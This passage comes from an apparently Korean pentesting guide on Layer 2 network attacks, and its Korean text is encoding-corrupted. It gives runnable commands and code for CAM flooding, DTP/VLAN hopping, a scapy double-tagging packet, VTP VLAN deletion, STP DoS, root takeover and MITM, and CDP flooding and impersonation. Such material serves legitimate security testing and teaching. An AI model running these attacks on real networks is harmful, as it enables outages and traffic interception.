ìŠ¤ìœ„ì¹˜ì˜ CAM í…Œì´ë¸”ì„ ì˜¤ë²„í”Œë¡œìš°ì‹œí‚¤ê¸° ìœ„í•´ ë‹¤ì–‘í•œ ì†ŒìŠ¤ MAC ì£¼ì†Œë¡œ ë§ì€ íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤. CAM í…Œì´ë¸”ì´ ê°€ë“ ì°¨ë©´ ìŠ¤ìœ„ì¹˜ëŠ” í—ˆë¸Œì²˜ëŸ¼ ë™ì‘í•˜ê¸° ì‹œì‘í•©ë‹ˆë‹¤(ëª¨ë“  íŠ¸ë˜í”½ì„ ë¸Œë¡œë“œìºìŠ¤íŠ¸).
```bash
macof -i <interface>
```
In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)**ëŠ” ë§í¬ ê³„ì¸µ í”„ë¡œí† ì½œë¡œ ì„¤ê³„ë˜ì–´ ìë™ íŠ¸ë í‚¹ ì‹œìŠ¤í…œì„ ìš©ì´í•˜ê²Œ í•˜ë©°, ìŠ¤ìœ„ì¹˜ê°€ íŠ¸ë í¬ ëª¨ë“œ(Trunk) ë˜ëŠ” ë¹„íŠ¸ë í¬ ëª¨ë“œë¥¼ ìœ„í•´ í¬íŠ¸ë¥¼ ìë™ìœ¼ë¡œ ì„ íƒí•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. **DTP**ì˜ ë°°ì¹˜ëŠ” ì¢…ì¢… ìµœì ì´ ì•„ë‹Œ ë„¤íŠ¸ì›Œí¬ ì„¤ê³„ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ê²ƒìœ¼ë¡œ ê°„ì£¼ë˜ë©°, í•„ìš”í•  ë•Œë§Œ ìˆ˜ë™ìœ¼ë¡œ íŠ¸ë í¬ë¥¼ êµ¬ì„±í•˜ê³  ì ì ˆí•œ ë¬¸ì„œë¥¼ ë³´ì¥í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ ìŠ¤ìœ„ì¹˜ í¬íŠ¸ëŠ” Dynamic Auto ëª¨ë“œë¡œ ì„¤ì •ë˜ì–´ ìˆì–´, ì´ì›ƒ ìŠ¤ìœ„ì¹˜ì— ì˜í•´ íŠ¸ë í‚¹ì„ ì‹œì‘í•  ì¤€ë¹„ê°€ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë³´ì•ˆ ë¬¸ì œëŠ” íœí…ŒìŠ¤í„°ë‚˜ ê³µê²©ìê°€ ìŠ¤ìœ„ì¹˜ì— ì—°ê²°í•˜ê³  DTP Desirable í”„ë ˆì„ì„ ì „ì†¡í•˜ì—¬ í¬íŠ¸ë¥¼ íŠ¸ë í¬ ëª¨ë“œë¡œ ê°•ì œí•  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ ê³µê²©ìê°€ STP í”„ë ˆì„ ë¶„ì„ì„ í†µí•´ VLANì„ ì—´ê±°í•˜ê³  ê°€ìƒ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì„¤ì •í•˜ì—¬ VLAN ì„¸ë¶„í™”ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

ë§ì€ ìŠ¤ìœ„ì¹˜ì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ DTPê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì€ ì ë“¤ì´ ìŠ¤ìœ„ì¹˜ì˜ ë™ì‘ì„ ëª¨ë°©í•˜ì—¬ ëª¨ë“  VLANì˜ íŠ¸ë˜í”½ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)ëŠ” ì¸í„°í˜ì´ìŠ¤ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ ìŠ¤ìœ„ì¹˜ê°€ Default, Trunk, Dynamic, Auto ë˜ëŠ” Access ëª¨ë“œì— ìˆëŠ”ì§€ë¥¼ ë‚˜íƒ€ë‚´ë©°, Access ëª¨ë“œë§Œì´ VLAN í™‰í•‘ ê³µê²©ì— ë©´ì—­ì¸ êµ¬ì„±ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ìŠ¤ìœ„ì¹˜ì˜ ì·¨ì•½ì„± ìƒíƒœë¥¼ í‰ê°€í•©ë‹ˆë‹¤.

ë„¤íŠ¸ì›Œí¬ ì·¨ì•½ì„±ì´ í™•ì¸ë˜ë©´, _**Yersinia**_ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ DTP í”„ë¡œí† ì½œì„ í†µí•´ "íŠ¸ë í‚¹ í™œì„±í™”"ë¥¼ ìˆ˜í–‰í•˜ì—¬ ëª¨ë“  VLANì˜ íŒ¨í‚·ì„ ê´€ì°°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

VLANì„ ì—´ê±°í•˜ê¸° ìœ„í•´ [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ DTP Desirable í”„ë ˆì„ì„ ìƒì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì–´ë–¤ ìƒí™©ì—ì„œë„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¤‘ë‹¨í•˜ì§€ ë§ˆì‹­ì‹œì˜¤. DTP Desirableì„ ë§¤ 3ì´ˆë§ˆë‹¤ ì£¼ì…í•©ë‹ˆë‹¤. **ìŠ¤ìœ„ì¹˜ì—ì„œ ë™ì ìœ¼ë¡œ ìƒì„±ëœ íŠ¸ë í¬ ì±„ë„ì€ 5ë¶„ ë™ì•ˆë§Œ ìœ ì§€ë©ë‹ˆë‹¤. 5ë¶„ í›„ì— íŠ¸ë í¬ê°€ ëŠì–´ì§‘ë‹ˆë‹¤.**
```
sudo python3 DTPHijacking.py --interface eth0
```
I would like to point out that **Access/Desirable (0x03)** indicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And **802.1Q/802.1Q (0xa5**) indicates the **802.1Q** encapsulation type.

By analyzing the STP frames, **we learn about the existence of VLAN 30 and VLAN 60.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### íŠ¹ì • VLAN ê³µê²©

VLAN IDì™€ IP ê°’ì„ ì•Œê²Œ ë˜ë©´, **íŠ¹ì • VLANì„ ê³µê²©í•˜ê¸° ìœ„í•´ ê°€ìƒ ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
DHCPê°€ ì‚¬ìš© ê°€ëŠ¥í•˜ì§€ ì•Šìœ¼ë©´, _ifconfig_ë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ì  IP ì£¼ì†Œë¥¼ ì„¤ì •í•˜ì‹­ì‹œì˜¤.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

ë…¼ì˜ëœ ê³µê²©ì¸ **Dynamic Trunkingê³¼ ê°€ìƒ ì¸í„°í˜ì´ìŠ¤ ìƒì„± ë° ë‹¤ë¥¸ VLAN ë‚´ í˜¸ìŠ¤íŠ¸ ë°œê²¬**ì€ ë„êµ¬ì— ì˜í•´ **ìë™ìœ¼ë¡œ ìˆ˜í–‰ë©ë‹ˆë‹¤**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

ê³µê²©ìê°€ **í¬ìƒì í˜¸ìŠ¤íŠ¸ì˜ MAC, IP ë° VLAN ID ê°’ì„** ì•Œê³  ìˆë‹¤ë©´, ê·¸ëŠ” **í”„ë ˆì„ì„ ë‘ ë²ˆ íƒœê·¸**í•˜ì—¬ ì§€ì •ëœ VLANê³¼ í¬ìƒìì˜ VLANìœ¼ë¡œ íŒ¨í‚·ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **í¬ìƒìê°€ ê³µê²©ìì™€ ì—°ê²°í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì—**, **ê³µê²©ìê°€ UDPë¥¼ í†µí•´ í†µì‹ í•˜ëŠ” ê²ƒì´ ìµœì„ ì˜ ì„ íƒ**ì…ë‹ˆë‹¤. ì´ëŠ” SNMPì™€ ê°™ì€ í¥ë¯¸ë¡œìš´ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” í”„ë¡œí† ì½œì…ë‹ˆë‹¤.

ê³µê²©ìì˜ ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ **ê³µê²©ìê°€ ì œì–´í•˜ëŠ” IPë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ í¬ìƒìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” TCP í¬íŠ¸ ìŠ¤ìº”ì„ ì‹œì‘í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤ (ì•„ë§ˆë„ ì¸í„°ë„·ì„ í†µí•´). ê·¸ëŸ° ë‹¤ìŒ, ê³µê²©ìëŠ” í¬ìƒìë¡œë¶€í„° íŒ¨í‚·ì„ ìˆ˜ì‹ í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ê·¸ê°€ ì†Œìœ í•œ ë‘ ë²ˆì§¸ í˜¸ìŠ¤íŠ¸ì—ì„œ ìŠ¤ë‹ˆí•‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (190).png>)

ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ë ¤ë©´ scapyë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

ë‹¹ì‹ ì´ **ì§ì ‘ ì—°ê²°ëœ ìŠ¤ìœ„ì¹˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´**, ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ **VLAN ì„¸ë¶„í™”ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**ì´ ìˆìŠµë‹ˆë‹¤. ê°„ë‹¨íˆ **í¬íŠ¸ë¥¼ íŠ¸ë í¬ ëª¨ë“œë¡œ ì „í™˜**í•˜ê³ (íŠ¸ë í¬ë¼ê³ ë„ ì•Œë ¤ì ¸ ìˆìŒ), ëŒ€ìƒ VLANì˜ IDë¡œ ê°€ìƒ ì¸í„°í˜ì´ìŠ¤ë¥¼ ìƒì„±í•œ í›„ IP ì£¼ì†Œë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤. ì£¼ì†Œë¥¼ ë™ì ìœ¼ë¡œ ìš”ì²­í•  ìˆ˜ë„ ìˆê³ (DHCP), ì •ì ìœ¼ë¡œ êµ¬ì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ê²½ìš°ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

ê²ŒìŠ¤íŠ¸ ë¬´ì„  ë„¤íŠ¸ì›Œí¬ì™€ ê°™ì€ íŠ¹ì • í™˜ê²½ì—ì„œëŠ” **í¬íŠ¸ ê²©ë¦¬(í”„ë¼ì´ë¹— VLANì´ë¼ê³ ë„ í•¨)** ì„¤ì •ì´ êµ¬í˜„ë˜ì–´ ë¬´ì„  ì•¡ì„¸ìŠ¤ í¬ì¸íŠ¸ì— ì—°ê²°ëœ í´ë¼ì´ì–¸íŠ¸ê°€ ì„œë¡œ ì§ì ‘ í†µì‹ í•˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ê²©ë¦¬ ì¡°ì¹˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ê¸°ìˆ ì´ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ë„¤íŠ¸ì›Œí¬ ACLì˜ ë¶€ì¡± ë˜ëŠ” ì˜ëª»ëœ êµ¬ì„±ì„ ì´ìš©í•˜ì—¬ IP íŒ¨í‚·ì´ ë¼ìš°í„°ë¥¼ í†µí•´ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì˜ ë‹¤ë¥¸ í´ë¼ì´ì–¸íŠ¸ì— ë„ë‹¬í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

ê³µê²©ì€ **ëŒ€ìƒ í´ë¼ì´ì–¸íŠ¸ì˜ IP ì£¼ì†Œë¥¼ í¬í•¨í•˜ì§€ë§Œ ë¼ìš°í„°ì˜ MAC ì£¼ì†Œë¥¼ ê°€ì§„ íŒ¨í‚·ì„ ìƒì„±**í•˜ì—¬ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ë¼ìš°í„°ëŠ” íŒ¨í‚·ì„ ì˜ëª» ì „ë‹¬í•˜ì—¬ ëŒ€ìƒ í´ë¼ì´ì–¸íŠ¸ì—ê²Œ ì „ë‹¬í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ í”¼í•´ìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” í˜¸ìŠ¤íŠ¸ë¥¼ ì œì–´í•˜ì—¬ ë³´ì•ˆ ê²°í•¨ì„ ì´ìš©í•˜ëŠ” ë”ë¸” íƒœê¹… ê³µê²©ì—ì„œ ì‚¬ìš©ë˜ëŠ” ë°©ì‹ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤.

**ê³µê²©ì˜ ì£¼ìš” ë‹¨ê³„:**

1. **íŒ¨í‚· ì œì‘:** ëŒ€ìƒ í´ë¼ì´ì–¸íŠ¸ì˜ IP ì£¼ì†Œë¥¼ í¬í•¨í•˜ì§€ë§Œ ë¼ìš°í„°ì˜ MAC ì£¼ì†Œë¥¼ ê°€ì§„ íŒ¨í‚·ì„ íŠ¹ë³„íˆ ì œì‘í•©ë‹ˆë‹¤.
2. **ë¼ìš°í„° ë™ì‘ ì´ìš©:** ì œì‘ëœ íŒ¨í‚·ì´ ë¼ìš°í„°ë¡œ ì „ì†¡ë˜ë©°, êµ¬ì„±ìœ¼ë¡œ ì¸í•´ íŒ¨í‚·ì´ ëŒ€ìƒ í´ë¼ì´ì–¸íŠ¸ë¡œ ë¦¬ë””ë ‰ì…˜ë˜ì–´ í”„ë¼ì´ë¹— VLAN ì„¤ì •ì— ì˜í•´ ì œê³µë˜ëŠ” ê²©ë¦¬ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤.

### VTP Attacks

VTP (VLAN Trunking Protocol)ëŠ” VLAN ê´€ë¦¬ë¥¼ ì¤‘ì•™ ì§‘ì¤‘í™”í•©ë‹ˆë‹¤. VLAN ë°ì´í„°ë² ì´ìŠ¤ ë¬´ê²°ì„±ì„ ìœ ì§€í•˜ê¸° ìœ„í•´ ìˆ˜ì • ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ë©°, ìˆ˜ì •ì´ ì´ë£¨ì–´ì§ˆ ë•Œë§ˆë‹¤ ì´ ë²ˆí˜¸ê°€ ì¦ê°€í•©ë‹ˆë‹¤. ìŠ¤ìœ„ì¹˜ëŠ” ë” ë†’ì€ ìˆ˜ì • ë²ˆí˜¸ë¥¼ ê°€ì§„ êµ¬ì„±ì„ ì±„íƒí•˜ì—¬ ìì‹ ì˜ VLAN ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤.

#### VTP Domain Roles

* **VTP Server:** VLANì„ ê´€ë¦¬í•©ë‹ˆë‹¤â€”ìƒì„±, ì‚­ì œ, ìˆ˜ì •. ë„ë©”ì¸ êµ¬ì„±ì›ì—ê²Œ VTP ì•Œë¦¼ì„ ë°©ì†¡í•©ë‹ˆë‹¤.
* **VTP Client:** VTP ì•Œë¦¼ì„ ìˆ˜ì‹ í•˜ì—¬ VLAN ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë™ê¸°í™”í•©ë‹ˆë‹¤. ì´ ì—­í• ì€ ë¡œì»¬ VLAN êµ¬ì„± ìˆ˜ì •ì´ ì œí•œë©ë‹ˆë‹¤.
* **VTP Transparent:** VTP ì—…ë°ì´íŠ¸ì— ì°¸ì—¬í•˜ì§€ ì•Šì§€ë§Œ VTP ì•Œë¦¼ì„ ì „ë‹¬í•©ë‹ˆë‹¤. VTP ê³µê²©ì˜ ì˜í–¥ì„ ë°›ì§€ ì•Šìœ¼ë©°, ìˆ˜ì • ë²ˆí˜¸ëŠ” í•­ìƒ 0ìœ¼ë¡œ ìœ ì§€ë©ë‹ˆë‹¤.

#### VTP Advertisement Types

* **Summary Advertisement:** VTP ì„œë²„ì— ì˜í•´ 300ì´ˆë§ˆë‹¤ ë°©ì†¡ë˜ë©°, í•„ìˆ˜ ë„ë©”ì¸ ì •ë³´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **Subset Advertisement:** VLAN êµ¬ì„± ë³€ê²½ í›„ ì „ì†¡ë©ë‹ˆë‹¤.
* **Advertisement Request:** VTP í´ë¼ì´ì–¸íŠ¸ê°€ Summary Advertisementë¥¼ ìš”ì²­í•˜ê¸° ìœ„í•´ ë°œí–‰í•˜ë©°, ì¼ë°˜ì ìœ¼ë¡œ ë” ë†’ì€ êµ¬ì„± ìˆ˜ì • ë²ˆí˜¸ë¥¼ ê°ì§€í•œ í›„ì— ë°œìƒí•©ë‹ˆë‹¤.

VTP ì·¨ì•½ì ì€ íŠ¸ë í¬ í¬íŠ¸ë¥¼ í†µí•´ì„œë§Œ ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, VTP ì•Œë¦¼ì€ ì˜¤ì§ íŠ¸ë í¬ í¬íŠ¸ë¥¼ í†µí•´ì„œë§Œ ìˆœí™˜í•©ë‹ˆë‹¤. DTP ê³µê²© í›„ ì‹œë‚˜ë¦¬ì˜¤ëŠ” VTPë¡œ ì „í™˜ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Yersiniaì™€ ê°™ì€ ë„êµ¬ëŠ” VTP ê³µê²©ì„ ìš©ì´í•˜ê²Œ í•˜ì—¬ VLAN ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì‚­ì œí•˜ê³  ë„¤íŠ¸ì›Œí¬ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ì¤‘ë‹¨ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì°¸ê³ : ì´ ë…¼ì˜ëŠ” VTP ë²„ì „ 1(VTPv1)ì— ê´€í•œ ê²ƒì…ë‹ˆë‹¤.
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Yersiniaì˜ ê·¸ë˜í”½ ëª¨ë“œì—ì„œ ëª¨ë“  VTP VLAN ì‚­ì œ ì˜µì…˜ì„ ì„ íƒí•˜ì—¬ VLAN ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì •ë¦¬í•˜ì‹­ì‹œì˜¤.

### STP ê³µê²©

**ì¸í„°í˜ì´ìŠ¤ì—ì„œ BPDU í”„ë ˆì„ì„ ìº¡ì²˜í•  ìˆ˜ ì—†ë‹¤ë©´ STP ê³µê²©ì— ì„±ê³µí•  ê°€ëŠ¥ì„±ì´ ë‚®ìŠµë‹ˆë‹¤.**

#### **STP BPDU DoS**

ë§ì€ BPDUs TCP (í† í´ë¡œì§€ ë³€ê²½ ì•Œë¦¼) ë˜ëŠ” Conf (í† í´ë¡œì§€ê°€ ìƒì„±ë  ë•Œ ì „ì†¡ë˜ëŠ” BPDUs)ë¥¼ ì „ì†¡í•˜ë©´ ìŠ¤ìœ„ì¹˜ê°€ ê³¼ë¶€í•˜ë˜ì–´ ì œëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šê²Œ ë©ë‹ˆë‹¤.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP ê³µê²©**

TCPê°€ ì „ì†¡ë˜ë©´ ìŠ¤ìœ„ì¹˜ì˜ CAM í…Œì´ë¸”ì€ 15ì´ˆ í›„ì— ì‚­ì œë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ íŒ¨í‚·ì„ ì§€ì†ì ìœ¼ë¡œ ì „ì†¡í•˜ë©´ CAM í…Œì´ë¸”ì´ ì§€ì†ì ìœ¼ë¡œ (ë˜ëŠ” ë§¤ 15ì´ˆë§ˆë‹¤) ì¬ì‹œì‘ë˜ê³ , ì¬ì‹œì‘ë  ë•Œ ìŠ¤ìœ„ì¹˜ëŠ” í—ˆë¸Œì²˜ëŸ¼ ë™ì‘í•©ë‹ˆë‹¤.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP ë£¨íŠ¸ ê³µê²©**

ê³µê²©ìëŠ” ìŠ¤ìœ„ì¹˜ì˜ ë™ì‘ì„ ì‹œë®¬ë ˆì´ì…˜í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ì˜ STP ë£¨íŠ¸ê°€ ë©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ë” ë§ì€ ë°ì´í„°ê°€ ê·¸ë¥¼ í†µê³¼í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ë‘ ê°œì˜ ë‹¤ë¥¸ ìŠ¤ìœ„ì¹˜ì— ì—°ê²°ë˜ì–´ ìˆì„ ë•Œ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤.\
ì´ëŠ” **ìš°ì„ ìˆœìœ„** ê°’ì´ ì‹¤ì œ ë£¨íŠ¸ ìŠ¤ìœ„ì¹˜ì˜ ì‹¤ì œ ìš°ì„ ìˆœìœ„ë³´ë‹¤ ë‚®ë‹¤ê³  ë§í•˜ëŠ” BPDUs CONF íŒ¨í‚·ì„ ì „ì†¡í•˜ì—¬ ìˆ˜í–‰ë©ë‹ˆë‹¤.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**ê³µê²©ìê°€ 2ê°œì˜ ìŠ¤ìœ„ì¹˜ì— ì—°ê²°ë˜ì–´ ìˆë‹¤ë©´ ê·¸ëŠ” ìƒˆë¡œìš´ íŠ¸ë¦¬ì˜ ë£¨íŠ¸ê°€ ë  ìˆ˜ ìˆìœ¼ë©°, ê·¸ ìŠ¤ìœ„ì¹˜ë“¤ ê°„ì˜ ëª¨ë“  íŠ¸ë˜í”½ì€ ê·¸ë¥¼ í†µê³¼í•˜ê²Œ ë©ë‹ˆë‹¤** (MITM ê³µê²©ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP ê³µê²©

CISCO Discovery Protocol (CDP)ëŠ” CISCO ì¥ì¹˜ ê°„ì˜ í†µì‹ ì— í•„ìˆ˜ì ì´ë©°, ì´ë¥¼ í†µí•´ **ì„œë¡œë¥¼ ì‹ë³„í•˜ê³  êµ¬ì„± ì„¸ë¶€ì •ë³´ë¥¼ ê³µìœ **í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ìˆ˜ë™ ë°ì´í„° ìˆ˜ì§‘ <a href="#id-0e0f" id="id-0e0f"></a>

CDPëŠ” ëª¨ë“  í¬íŠ¸ë¥¼ í†µí•´ ì •ë³´ë¥¼ ë¸Œë¡œë“œìºìŠ¤íŠ¸í•˜ë„ë¡ êµ¬ì„±ë˜ì–´ ìˆì–´ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìëŠ” ìŠ¤ìœ„ì¹˜ í¬íŠ¸ì— ì—°ê²°í•˜ë©´ **Wireshark**, **tcpdump**, ë˜ëŠ” **Yersinia**ì™€ ê°™ì€ ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí¼ë¥¼ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì‘ì—…ì€ ë„¤íŠ¸ì›Œí¬ ì¥ì¹˜ì— ëŒ€í•œ ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì—ëŠ” ëª¨ë¸ê³¼ ì‹¤í–‰ ì¤‘ì¸ Cisco IOS ë²„ì „ì´ í¬í•¨ë©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì‹ë³„ëœ Cisco IOS ë²„ì „ì˜ íŠ¹ì • ì·¨ì•½ì ì„ ëª©í‘œë¡œ ì‚¼ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### CDP í…Œì´ë¸” í”ŒëŸ¬ë”© ìœ ë„ <a href="#id-0d6a" id="id-0d6a"></a>

ë³´ë‹¤ ê³µê²©ì ì¸ ì ‘ê·¼ ë°©ì‹ì€ í•©ë²•ì ì¸ CISCO ì¥ì¹˜ì¸ ì²™í•˜ì—¬ ìŠ¤ìœ„ì¹˜ì˜ ë©”ëª¨ë¦¬ë¥¼ ì••ë„í•¨ìœ¼ë¡œì¨ ì„œë¹„ìŠ¤ ê±°ë¶€(DoS) ê³µê²©ì„ ì‹œì‘í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì•„ë˜ëŠ” Yersiniaë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ ê³µê²©ì„ ì‹œì‘í•˜ê¸° ìœ„í•œ ëª…ë ¹ì–´ ì‹œí€€ìŠ¤ì…ë‹ˆë‹¤:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
ì´ ê³µê²© ë™ì•ˆ ìŠ¤ìœ„ì¹˜ì˜ CPUì™€ CDP ì´ì›ƒ í…Œì´ë¸”ì´ ì‹¬ê°í•˜ê²Œ ë¶€ë‹´ì„ ë°›ì•„, ê³¼ë„í•œ ìì› ì†Œë¹„ë¡œ ì¸í•´ ì¢…ì¢… **â€œë„¤íŠ¸ì›Œí¬ ë§ˆë¹„â€**ë¼ê³  ë¶ˆë¦¬ëŠ” ìƒíƒœì— ì´ë¥´ê²Œ ë©ë‹ˆë‹¤.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP ê³µê²© ë° VoIP í˜¸í¼ ë„êµ¬

